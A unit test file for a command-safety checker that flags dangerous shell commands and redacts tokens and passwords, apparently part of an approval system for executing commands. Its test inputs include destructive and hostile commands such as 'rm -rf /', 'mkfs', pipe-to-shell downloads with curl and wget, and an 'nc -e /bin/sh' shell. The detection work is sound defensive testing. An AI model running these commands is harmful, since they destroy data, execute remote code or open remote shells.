/**
 * Unit tests for dangerous command detection
 */

import { isDangerous, sanitizeCommand, getDangerReason } from '../approvals/safety';

describe('Approvals Safety', () => {
  describe('isDangerous', () => {
    it('should detect rm -rf as dangerous', () => {
      expect(isDangerous('rm -rf /')).toBe(true);
      expect(isDangerous('rm -rf /home/user')).toBe(true);
      expect(isDangerous('rm -rf ./temp')).toBe(true);
    });

    it('should detect rm -r as dangerous', () => {
      expect(isDangerous('rm -r /some/path')).toBe(true);
    });

    it('should detect sudo as dangerous', () => {
      expect(isDangerous('sudo apt-get update')).toBe(true);
      expect(isDangerous('sudo -i')).toBe(true);
      expect(isDangerous('sudo su')).toBe(true);
    });

    it('should detect chmod 0xxx as dangerous', () => {
      expect(isDangerous('chmod 0777 file')).toBe(true);
      expect(isDangerous('chmod 0000 file')).toBe(true);
    });

    it('should detect mkfs as dangerous', () => {
      expect(isDangerous('mkfs.ext4 /dev/sda1')).toBe(true);
    });

    it('should detect device file writes as dangerous', () => {
      expect(isDangerous('echo test > /dev/null')).toBe(true);
      expect(isDangerous('cat file > /dev/urandom')).toBe(true);
    });

    it('should detect dd as dangerous', () => {
      expect(isDangerous('dd if=/dev/zero of=test.img')).toBe(true);
    });

    it('should detect eval as dangerous', () => {
      expect(isDangerous('eval "echo hello"')).toBe(true);
    });

    it('should detect exec as dangerous', () => {
      expect(isDangerous('exec bash')).toBe(true);
    });

    it('should not flag safe commands', () => {
      expect(isDangerous('ls -la')).toBe(false);
      expect(isDangerous('cat file.txt')).toBe(false);
      expect(isDangerous('git status')).toBe(false);
      expect(isDangerous('npm install')).toBe(false);
      expect(isDangerous('echo "Hello World"')).toBe(false);
      expect(isDangerous('node script.js')).toBe(false);
    });

    it('should detect pipe to wget/curl as dangerous', () => {
      expect(isDangerous('curl http://example.com | bash')).toBe(true);
      expect(isDangerous('wget http://example.com | sh')).toBe(true);
    });

    it('should detect netcat with execute as dangerous', () => {
      expect(isDangerous('nc -e /bin/sh localhost 1234')).toBe(true);
    });

    it('should detect shell execution as dangerous', () => {
      expect(isDangerous('/bin/sh -c "echo hello"')).toBe(true);
      expect(isDangerous('/bin/bash -c "ls"')).toBe(true);
    });
  });

  describe('sanitizeCommand', () => {
    it('should redact tokens', () => {
      const result = sanitizeCommand('npm install --token=abc123 xyz');
      expect(result).not.toContain('abc123');
      expect(result).toContain('<REDACTED>');
    });

    it('should redact API keys', () => {
      const result = sanitizeCommand('curl -k "https://api.example.com" --api-key=secret123');
      expect(result).not.toContain('secret123');
    });

    it('should redact passwords', () => {
      const result = sanitizeCommand('command --password="mypassword"');
      expect(result).not.toContain('mypassword');
    });

    it('should preserve safe parts of the command', () => {
      const result = sanitizeCommand('npm install --token=abc123');
      expect(result).toContain('npm install');
      expect(result).not.toContain('abc123');
    });
  });

  describe('getDangerReason', () => {
    it('should return reason for rm -rf', () => {
      const reason = getDangerReason('rm -rf /tmp');
      expect(reason).toContain('rm -rf');
    });

    it('should return reason for sudo', () => {
      const reason = getDangerReason('sudo apt-get update');
      expect(reason).toContain('sudo');
    });

    it('should return reason for chmod 777', () => {
      const reason = getDangerReason('chmod 777 file');
      expect(reason).toContain('chmod 777');
    });

    it('should return empty string for safe commands', () => {
      const reason = getDangerReason('ls -la');
      expect(reason).toBe('');
    });
  });
});
